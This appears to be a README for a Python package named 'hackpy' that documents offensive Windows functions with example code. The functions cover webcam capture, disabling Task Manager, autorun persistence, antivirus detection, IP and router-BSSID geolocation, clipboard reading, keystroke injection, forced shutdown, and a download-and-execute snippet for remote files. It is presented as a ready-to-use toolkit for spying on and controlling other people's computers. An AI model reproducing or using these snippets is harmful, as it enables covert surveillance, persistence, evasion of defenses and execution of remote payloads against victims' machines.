![Python](https://www.python.org/static/img/python-logo@2x.png)
# `pip install hackpy` :bomb:

# Example usage:
``` python
# Import modules
import os
import hackpy
```


# Webcam screenshot
``` python
hackpy.webcam(filename = 'screenshot.png', delay = 4500, camera = 1)
```

# TaskManager
``` python
# If process iexplore.exe found:
if hackpy.taskmanager.find('iexplore.exe') == True:
    # Stop iexplore.exe process
    hackpy.taskmanager.kill('iexplore.exe') 
    # start firefox.exe process
    hackpy.taskmanager.start('firefox.exe')
    
# Return dictonary with all processes
for process in hackpy.taskmanager.list(): 
    print( process )

hackpy.taskmanager.disable() # Disable windows taskmgr.exe
hackpy.taskmanager.enable()  # Enable windows taskmgr.exe
```

# Autorun
``` python
# Add cmd.exe to startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = True)

# Remove cmd.exe from startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False)
```

# Detect installed antivirus software on computer:
``` python
data = hackpy.detect_protection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
```

# Information about you IP:
``` python
data = hackpy.whois()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as", "local"}

# Information about other IP:
data = hackpy.whois('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get geodata about you IP:
data = hackpy.geoplugin()
print('[?] - Latitude: ' + data['geoplugin_latitude'])
# Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}
```

# Get router bssid:
``` python
bssid_string = hackpy.router() # BETA
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate(bssid_string)
print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))
```

# Windows messagebox:
``` python
hackpy.messagebox('error', 'LOL', 'System has been killed :D') # none, info, error, warning, question types
```

# Nircmdc commands
``` python
# You can run nircmdc commands in python
hackpy.command.nircmdc('monitor off')
hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')

# Nircmdc reference: https://nircmd.nirsoft.net
```

# System commands
``` python
hackpy.command.system('shutdown -s -t 260')
```

# SendKeyPress:
``` python
hackpy.sendkey('Hello bro{ENTER}')
# Other keys: https://pastebin.com/Ns3P7UiH
```

# Clipboard
``` python
# Get text from clipboard:
data = hackpy.clipboard.get()
print('Text in clipboard is ' + data)

# Set text to clipboard:
hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
```

# Download python and install it:
``` python
if hackpy.check_python() == False: # Check if python installed on system. False - not installed, True - installed.
    print('Python is not installed, trying to install!')
    hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37
else:
    print('Python is installed!')
```

# Load and execute file from internet
``` python
file = hackpy.wget(url)
os.startfile(file)
```

### Nircmdc reference: *https://nircmd.nirsoft.net*

![SITE](https://i.ibb.co/znRLN0D/image.png)
